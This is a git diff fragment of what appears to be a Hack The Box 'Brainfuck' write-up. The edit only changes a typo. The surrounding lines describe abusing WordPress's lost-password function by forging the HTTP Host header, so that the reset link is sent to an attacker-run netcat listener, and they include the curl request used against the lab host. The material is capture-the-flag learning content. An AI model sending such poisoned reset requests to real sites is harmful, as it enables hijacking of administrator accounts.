@@ -114,7 +114,7 @@ This looks like a generic informational file from WordPress, but the juciy piece
 In short, we can abuse the reset password function of the WordPress login form, to make the server send a reset link to an email server we control using the `Host` HTTP header. 
 
 
-Trying to pull this off is fairly trivial as well, all I did is start a local listner on my Kali machine on port 25 using `nc -lnvp 25`. Then, I sent the following request to the target:
+Trying to pull this off is fairly trivial as well, all I did is start a local lisetner on my Kali machine on port 25 using `nc -lnvp 25`. Then, I sent the following request to the target:
 
 ```bash
 curl -k -X POST https://brainfuck.htb/wp-login.php?action=lostpassword -H 'Host: 10.10.14.54' -H 'Content-Type:  application/x-www-form-urlencoded' -H 'Content-Length: 56' -F 'user_login=admin' -F 'redirect_to=' -F 'wp-submit=Get+New+Password' 
